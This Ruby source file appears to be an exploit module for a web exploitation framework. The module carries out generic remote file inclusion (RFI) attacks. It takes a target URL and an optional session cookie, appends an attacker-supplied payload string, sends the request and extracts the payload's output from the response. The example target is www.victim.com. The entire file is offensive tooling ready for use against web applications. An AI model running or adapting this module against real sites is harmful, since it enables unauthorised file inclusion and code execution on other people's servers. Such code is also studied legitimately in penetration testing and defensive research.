

class WebXploit <  WXf::WXfmod_Factory::Exploit
  
  include WXf::WXfassists::General::MechReq
  
  def initialize
        super( 
    'Name'        => 'Run a Generic RFI',
    'Version'     => '1.0',
    'Description' => %q{
       Generic RFI module. This module allows you to put enter the RURL and RFI type string in order to exploit RFI vulnerabilities.
       For example, http://www.victim.com/rfistring.php?some_vuln_function=.
    },
    'References'  =>
     [
        [ 'URL', 'http://example.com/' ]
       
     ],
    'Author'      => [ 'CKTRICKY' ],
    'License'     => WXF_LICENSE
)
    init_opts([
      OptString.new('COOKIE', [true, "Example: uniquecookie=cookievalue", nil])
     ])
      
  end

  def exploit       
    url = rurl + payload.payload_data
    cookie = datahash['COOKIE']
      
    if not cookie.nil?
      res = mech_req({
        'method'     => 'GET',
        'RURL'       => url,
        'HEADERS'    => {'Cookie' => cookie}
      })
    else
      res = mech_req({
        'method'     => 'GET',
        'RURL'       => url,
      })
    end
      
    if (rce_code)
      prnt_err("The following error has occured: #{rce_code}")
    end
         
    if (res) and (res.respond_to?('body'))
      payload.payload_extraction(res.body)
    end
  
  end 
            
          
      
          
          
    
end
